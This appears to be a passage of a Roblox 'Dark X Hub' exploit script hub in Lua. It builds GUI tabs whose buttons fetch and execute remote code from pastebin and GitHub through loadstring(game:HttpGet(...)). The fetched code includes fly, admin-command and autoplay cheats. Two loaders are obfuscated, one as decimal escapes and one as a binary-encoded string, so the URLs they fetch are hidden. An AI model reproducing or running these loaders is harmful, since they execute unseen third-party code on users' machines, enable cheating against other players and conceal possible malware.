FEFly.MouseButton1Down:Connect(function()
	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
end)

UICorner_27.Parent = FEFly

FEHoldAcc.Name = "FE Hold Acc"
FEHoldAcc.Parent = ScriptsTab
FEHoldAcc.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
FEHoldAcc.Position = UDim2.new(0.0303030014, 0, 0.666666687, 0)
FEHoldAcc.Size = UDim2.new(0, 106, 0, 24)
FEHoldAcc.Font = Enum.Font.SourceSans
FEHoldAcc.Text = "FE Hold Acc"
FEHoldAcc.TextColor3 = Color3.fromRGB(0, 0, 0)
FEHoldAcc.TextSize = 14.000
FEHoldAcc.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/4pmyQZ3k"))()
end)

UICorner_28.Parent = FEHoldAcc

HatsV2.Name = "Hats V2"
HatsV2.Parent = ScriptsTab
HatsV2.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
HatsV2.Position = UDim2.new(0.585858583, 0, 0.666666687, 0)
HatsV2.Size = UDim2.new(0, 106, 0, 24)
HatsV2.Font = Enum.Font.SourceSans
HatsV2.Text = "Hats V2"
HatsV2.TextColor3 = Color3.fromRGB(0, 0, 0)
HatsV2.TextSize = 14.000
HatsV2.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/xtfYXZ5y"))()
end)

UICorner_29.Parent = HatsV2

Keyboard.Name = "Keyboard"
Keyboard.Parent = ScriptsTab
Keyboard.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
Keyboard.Position = UDim2.new(0.0303030312, 0, 0.822784841, 0)
Keyboard.Size = UDim2.new(0, 271, 0, 24)
Keyboard.Font = Enum.Font.SourceSans
Keyboard.Text = "Keyboard"
Keyboard.TextColor3 = Color3.fromRGB(0, 0, 0)
Keyboard.TextSize = 14.000
Keyboard.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/manimcool21/Keyboard-FE/main/Protected%20(3).lua'),true))()
end)

UICorner_30.Parent = Keyboard

AdminTab.Name = "AdminTab"
AdminTab.Parent = OutLine
AdminTab.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
AdminTab.Position = UDim2.new(0.24427481, 0, 0.00420168089, 0)
AdminTab.Size = UDim2.new(0, 297, 0, 237)
AdminTab.Visible = false

TextLabel_4.Parent = AdminTab
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.Size = UDim2.new(0, 297, 0, 35)
TextLabel_4.Font = Enum.Font.SourceSans
TextLabel_4.Text = "Admin"
TextLabel_4.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_4.TextSize = 25.000

UICorner_31.Parent = TextLabel_4

FatesAdmin.Name = "Fate's Admin"
FatesAdmin.Parent = AdminTab
FatesAdmin.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
FatesAdmin.Position = UDim2.new(0.0303030312, 0, 0.185654014, 0)
FatesAdmin.Size = UDim2.new(0, 114, 0, 76)
FatesAdmin.Font = Enum.Font.SourceSans
FatesAdmin.Text = "Gx Admin"
FatesAdmin.TextColor3 = Color3.fromRGB(0, 0, 0)
FatesAdmin.TextSize = 14.000
FatesAdmin.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/v6E9BmFK"))();
end)

UICorner_32.Parent = FatesAdmin

UICorner_33.Parent = AdminTab

RevisAdmin.Name = "Revis Admin"
RevisAdmin.Parent = AdminTab
RevisAdmin.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
RevisAdmin.Position = UDim2.new(0.585858583, 0, 0.185654014, 0)
RevisAdmin.Size = UDim2.new(0, 106, 0, 76)
RevisAdmin.Font = Enum.Font.SourceSans
RevisAdmin.Text = "Revis Admin"
RevisAdmin.TextColor3 = Color3.fromRGB(0, 0, 0)
RevisAdmin.TextSize = 14.000
RevisAdmin.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/8ZWWtfvT"))()
end)

UICorner_34.Parent = RevisAdmin

InfiniteYield.Name = "Infinite Yield"
InfiniteYield.Parent = AdminTab
InfiniteYield.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
InfiniteYield.Position = UDim2.new(0.0303030312, 0, 0.534291029, 0)
InfiniteYield.Size = UDim2.new(0, 271, 0, 102)
InfiniteYield.Font = Enum.Font.SourceSans
InfiniteYield.Text = "Infinite Yield"
InfiniteYield.TextColor3 = Color3.fromRGB(0, 0, 0)
InfiniteYield.TextSize = 31.000
InfiniteYield.TextWrapped = true
InfiniteYield.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
end)

UICorner_35.Parent = InfiniteYield

CreditsTab.Name = "CreditsTab"
CreditsTab.Parent = OutLine
CreditsTab.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
CreditsTab.Position = UDim2.new(0.24427481, 0, 0.00420168089, 0)
CreditsTab.Size = UDim2.new(0, 297, 0, 237)
CreditsTab.Visible = false

Credits_2.Name = "Credits"
Credits_2.Parent = CreditsTab
Credits_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Credits_2.BackgroundTransparency = 1.000
Credits_2.Size = UDim2.new(0, 297, 0, 35)
Credits_2.Font = Enum.Font.SourceSans
Credits_2.Text = "Credits"
Credits_2.TextColor3 = Color3.fromRGB(0, 0, 0)
Credits_2.TextSize = 25.000

UICorner_36.Parent = Credits_2

UICorner_37.Parent = CreditsTab

TextLabel_5.Parent = CreditsTab
TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.BackgroundTransparency = 1.000
TextLabel_5.Position = UDim2.new(0, 0, 0.16455698, 0)
TextLabel_5.Size = UDim2.new(0, 297, 0, 100)
TextLabel_5.Font = Enum.Font.SourceSans
TextLabel_5.Text = "Dark X Hub is made by ItzzJoshua_"
TextLabel_5.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_5.TextSize = 19.000

UICorner_38.Parent = TextLabel_5

TextLabel_6.Parent = CreditsTab
TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.BackgroundTransparency = 1.000
TextLabel_6.Position = UDim2.new(0, 0, 0.219409302, 0)
TextLabel_6.Size = UDim2.new(0, 297, 0, 100)
TextLabel_6.Font = Enum.Font.SourceSans
TextLabel_6.Text = "Credits to the Owners of Scripts"
TextLabel_6.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_6.TextSize = 19.000

UICorner_39.Parent = TextLabel_6

TextLabel_7.Parent = CreditsTab
TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.BackgroundTransparency = 1.000
TextLabel_7.Position = UDim2.new(0, 0, 0.738396645, 0)
TextLabel_7.Size = UDim2.new(0, 297, 0, 100)
TextLabel_7.Font = Enum.Font.SourceSans
TextLabel_7.Text = "Thanks for using Dark X Hub"
TextLabel_7.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_7.TextSize = 19.000

UICorner_40.Parent = TextLabel_7

HomeTab.Name = "HomeTab"
HomeTab.Parent = OutLine
HomeTab.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
HomeTab.Position = UDim2.new(0.24427481, 0, 0.00420168089, 0)
HomeTab.Size = UDim2.new(0, 297, 0, 237)

TextLabel_8.Parent = HomeTab
TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_8.BackgroundTransparency = 1.000
TextLabel_8.Size = UDim2.new(0, 297, 0, 35)
TextLabel_8.Font = Enum.Font.SourceSans
TextLabel_8.Text = "Home"
TextLabel_8.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_8.TextSize = 25.000

UICorner_41.Parent = TextLabel_8

UICorner_42.Parent = HomeTab

TextLabel_9.Parent = HomeTab
TextLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_9.BackgroundTransparency = 1.000
TextLabel_9.Position = UDim2.new(0, 0, 0.16455698, 0)
TextLabel_9.Size = UDim2.new(0, 297, 0, 100)
TextLabel_9.Font = Enum.Font.SourceSans
TextLabel_9.Text = "Hello User , Thanks for using Dark X Hub"
TextLabel_9.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_9.TextSize = 19.000

UICorner_43.Parent = TextLabel_9

TextLabel_10.Parent = HomeTab
TextLabel_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_10.BackgroundTransparency = 1.000
TextLabel_10.Position = UDim2.new(0, 0, 0.101265825, 0)
TextLabel_10.Size = UDim2.new(0, 297, 0, 100)
TextLabel_10.Font = Enum.Font.SourceSans
TextLabel_10.Text = "Welcome To Dark X Hub"
TextLabel_10.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_10.TextSize = 19.000

UICorner_44.Parent = TextLabel_10

TextLabel_11.Parent = HomeTab
TextLabel_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_11.BackgroundTransparency = 1.000
TextLabel_11.Position = UDim2.new(0, 0, 0.44725737, 0)
TextLabel_11.Size = UDim2.new(0, 297, 0, 100)
TextLabel_11.Font = Enum.Font.SourceSans
TextLabel_11.Text = "Go To Credits Tab To see the Owner of this HUB"
TextLabel_11.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_11.TextSize = 33.000
TextLabel_11.TextWrapped = true

UICorner_45.Parent = TextLabel_11

Close.Name = "Close"
Close.Parent = Main
Close.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Close.BorderColor3 = Color3.fromRGB(38, 38, 38)
Close.BorderSizePixel = 3
Close.Position = UDim2.new(0.950471699, 0, -0.0643939376, 0)
Close.Size = UDim2.new(0, 47, 0, 41)
Close.Font = Enum.Font.SourceSans
Close.Text = "X"
Close.TextColor3 = Color3.fromRGB(0, 0, 0)
Close.TextSize = 55.000
Close.MouseButton1Click:Connect(function()
	Open.Visible = true
	Main.Visible = false
end)

Open.Name = "Open"
Open.Parent = ScreenGui
Open.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
Open.BorderColor3 = Color3.fromRGB(38, 38, 38)
Open.BorderSizePixel = 3
Open.Position = UDim2.new(0.856321335, 0, 0.427166343, 0)
Open.Size = UDim2.new(0, 87, 0, 34)
Open.Font = Enum.Font.SourceSans
Open.Text = "OPEN"
Open.TextColor3 = Color3.fromRGB(75, 75, 75)
Open.TextSize = 33.000
Open.MouseButton1Click:Connect(function()
	Main.Visible = true
	Open.Visible = false
end)()
end)

Piano1Section:NewButton("Piano AutoPlay Gui Hubby Gui", "Kddjkdkdksjdjsksjjdskidjokok", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/JojGat/Hubby-GUI/main/Hubby%20Scripts%20GUI"))()
end)
Piano1Section:NewButton("Raining Tacos", "piano raining tacos", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/JojGat/Raining-Tacos-2/main/Raining%20Tacos"))()
end)
Piano1Section:NewButton("Faded Alan Walker", "Piano Faded", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/JojGat/Faded/main/faded"))()
end)
Piano1Section:NewButton("Megalovania", "Sans", function()
    local BinaryEncrypted = table.concat({'01101100','01101111','01100001','01100100','01110011','01110100','01110010','01101001','01101110','01100111','00101000','01100111','01100001','01101101','01100101','00111010','01001000','01110100','01110100','01110000','01000111','01100101','01110100','00101000','00100010','01101000','01110100','01110100','01110000','01110011','00111010','00101111','00101111','01110000','01100001','01110011','01110100','01100101','01100010','01101001','01101110','00101110','01100011','01101111','01101101','00101111','01110010','01100001','01110111','00101111','01111010','00110101','01110000','01111000','01100101','00111001','00110000','01010101','00100010','00101001','00101001','00101000','00101001',}) function decode(str) local function binary_to_string(bin) return string.char(tonumber(bin, 2));end;return (str:gsub("(".. ("[01]"):rep(8) .. ")", binary_to_string));end;local Binary = BinaryEncrypted _G.EncodedBinary = decode(Binary);loadstring(_G.EncodedBinary)()
end)
